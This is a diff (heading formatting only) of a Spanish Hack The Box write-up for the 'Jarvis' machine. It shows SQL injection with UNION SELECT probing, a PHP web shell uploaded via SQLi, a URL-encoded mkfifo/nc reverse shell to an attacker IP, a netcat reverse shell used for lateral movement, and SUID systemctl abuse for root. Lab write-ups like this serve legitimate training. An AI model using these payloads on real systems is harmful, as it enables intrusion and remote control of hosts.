@@ -3,38 +3,38 @@
 ![](../../../../~gitbook/image.md)Publicado: 21 de Mayo de 2025
 Autor: José Miguel Romero aKa x3m1Sec
 Dificultad: ⭐ Medium
-###📝 Descripción
+### 📝 Descripción
 Jarvis es una máquina Linux de dificultad media en Hack The Box. El objetivo principal es explotar una vulnerabilidad de inyección SQL en una aplicación web de un hotel para conseguir acceso inicial como usuario www-data. Posteriormente, se requiere escalar privilegios a través de un script Python vulnerable para alcanzar el usuario pepper, y finalmente abusar de un binario SUID (systemctl) para obtener acceso como root.La máquina destaca por la implementación de un sitio web de gestión hotelera con una vulnerabilidad clásica de SQLi, un ejemplo interesante de escalada horizontal a través de un script con filtros imperfectos, y una escalada vertical mediante el abuso de binarios con permisos especiales.Puntos clave:- Explotación de SQLi para lectura/escritura de archivos
 - Pivotaje entre usuarios aprovechando configuraciones incorrectas de sudo
 - Abuso de binarios SUID para alcanzar privilegios de root
 
-###🔭 Reconocimiento
+### 🔭 Reconocimiento
 
-####Ping para verificación en base a TTL
+#### Ping para verificación en base a TTL
 💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
-####Escaneo de puertos
+#### Escaneo de puertos
 
-####Enumeración de servicios
+#### Enumeración de servicios
 ![](../../../../~gitbook/image.md)⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
-###🌐 Enumeración Web
+### 🌐 Enumeración Web
 
-####64999 HTTP
+#### 64999 HTTP
 http://supersecurehotel.htb:64999/![](../../../../~gitbook/image.md)Aparte de este banner, no hay nada interesante.
-####80 HTTP
+#### 80 HTTP
 http://supersecurehotel.htb![](../../../../~gitbook/image.md)
-####Fuzzing de directorios
+#### Fuzzing de directorios
 Feroxbuster![](../../../../~gitbook/image.md)Dirsearch![](../../../../~gitbook/image.md)Gobuster![](../../../../~gitbook/image.md)Me gusta probar siempre varias herramientas para luego poner en conjunción los resultados. Aquí parece que hay un recurso importante a analizar y es /phpmyadminhttp://supersecurehotel.htb/phpmyadmin/![](../../../../~gitbook/image.md)Probamos las credenciales por defecto root:admin sin éxito.Enumeramos la versión gracias al fichero READMEhttp://supersecurehotel.htb/phpmyadmin/README![](../../../../~gitbook/image.md)También enumeramos un fichero de changelog en el que se indican los cambios que han sido aplicados en cada versión, siendo la 4.8.0 la última:http://supersecurehotel.htb/phpmyadmin/ChangeLog![](../../../../~gitbook/image.md)Verificamos que la versión 4.8.0 de phpmyadmin podría ser vulnerable a Cross site request forgery:https://www.exploit-db.com/exploits/44496![](../../../../~gitbook/image.md)Aunque pronto verificamos que no nos sirve.
-###💻 Explotación (SQLi)
+### 💻 Explotación (SQLi)
 Seguimos enumerando el sitio web, no tiene mucho donde rascar excepto en la sección de reserva de habitaciones:Verificamos si el parámetro GET `cod` podría ser vulnerable a SQLi
 http://supersecurehotel.htb/room.php?cod=2![](../../../../~gitbook/image.md)Introducimos simplemente una comilla en la petición y vemos que la respuesta se ve afectada:http://supersecurehotel.htb/room.php?cod=1'![](../../../../~gitbook/image.md)
 Realizamos esta petición cod=1+and+1=1 y observamos que se recupera la información de la habitación, lo cual nos indica que el parámetro es vulnerable a inyección SQL.El siguiente paso será determinar el número de columnas de la consulta, asíque vamos probando:cod=1+union+select+1cod=1+union+select+1,2cod=1+union+select+1,2,3cod=1+union+select+1,2,3,4cod=1+union+select+1,2,3,4,5cod=1+union+select+1,2,3,4,5,6cod=1+union+select+1,2,3,4,5,6,7![](../../../../~gitbook/image.md)cod=1+union+select+1,2,3,4,5,6,7,8Determinamos que hay 7 columnas porque cuando introducimos 8 ya no recibimos la respuesta correcta.Ahora realizamos la inyección para determinar el usuario:![](../../../../~gitbook/image.md)Ahora realizamos la inyección para determinar el nombre de la base de datos:![](../../../../~gitbook/image.md)Verificamos si podemos leer archivos a través de esta vulnerabilidad:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521111537.png]]![](../../../../~gitbook/image.md)Verificamos si podemos subir archivos al sistemaAhora abrimos la dirección:http://supersecurehotel.htb/test.txtY verificamos que se ha subido correctamente:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521112126.png]]![](../../../../~gitbook/image.md)
-####Foothold
+#### Foothold
 Con esta información, ahora podemos intentar subir una php shell mediante nuestra inyección sql:![](../../../../~gitbook/image.md)Verificamos la php shell que hemos subido:http://supersecurehotel.htb/shell.php?cmd=id![](../../../../~gitbook/image.md)Ahora podríamos conectarnos a nuestro host usando el siguiente payloadPero antes debemos codificarlo a URL:https://www.urlencoder.org/es/http://supersecurehotel.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.8%201234%20%3E%2Ftmp%2FfGanamos acceso al host como usuario www-data:
-####Mejoramos la shell
+#### Mejoramos la shell
 Intentamos obtener la primera flag pero no tenemos permisos:
-####Escalando a usuario pepper
+#### Escalando a usuario pepper
 Verificamos si hay algún usuario que pueda ejecutar algún binario o script como sudo:Intentamos ejecutar este script en python como usuario pepper y vemos las opciones:![](../../../../~gitbook/image.md)Analizando el código del script vemos que una de las opciones puede ser interesante, ya que se está usando al opción -pf para realizar un ping y estoy hace una llamada a os.system, por lo que si pasamos como comando /bin/bash podremos obtener una shell como pepper:![](../../../../~gitbook/image.md)Probamos el comando ping:![](../../../../~gitbook/image.md)Como vemos que hay algunos caracteres que se están filtrando, vamos a crear un archivo con una reverse shell usando netcat -e para habilitar el reconocimiento de secuencias de escape, como , , etcLanzamos ahora el comando y cuando nos pida la IP introducimos de la siguiente forma la ruta a nuestra reverse shell:![[Writeups/HTB/Road to OSCP/Lainkusanagi OSCP/Jarvis/Pasted image 20250521120419.png]]![](../../../../~gitbook/image.md)Recibimos la reverse shell como usuario pepper y obtenemos la primera flag:![](../../../../~gitbook/image.md)
-####👑 Escalada de privilegios
+#### 👑 Escalada de privilegios
 Verificamos servicios en ejecución, vemos que hay una base de datos mysql aunque esto ya lo sabíamos por nuestra enumeración mediante la inyección sql:![](../../../../~gitbook/image.md)Encontramos un fichero de conexión a la base de datos con las credenciales en texto claro.
 Tiene bastante buena pinta porque ya habíamos onbtenido el usuario DbAdmin y la base de datos hotel durante la inyección SQL:![](../../../../~gitbook/image.md)Nos conectamos a la base de datos:No encontramos nada que nos permita escalar privilegios.Verificamos archivos con SUID:El de systemctl puede ser interesante![](../../../../~gitbook/image.md)Encontramos información en gtfobins sobre como podemos abusar de este binario para escalar privilegios:https://gtfobins.github.io/gtfobins/systemctl/#suidNos movemos al directorio /home/pepper y ejecutamos lo siguiente:Creamos el enlace al servicio vulnerable:Esto creará un servicio que cuando lo invoquemos ejecutará un script que creamos en el directorio /home/pepper que será una reverse shell a nuestro host de ataque:El contenido de shell.sh será el siguiente:Iniciamos un listener en nuestro host de ataque:Lanzamos el servicioObtenemos acceso remoto al host como root y obtenemos la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
 - [🔭 Reconocimiento](#reconocimiento)
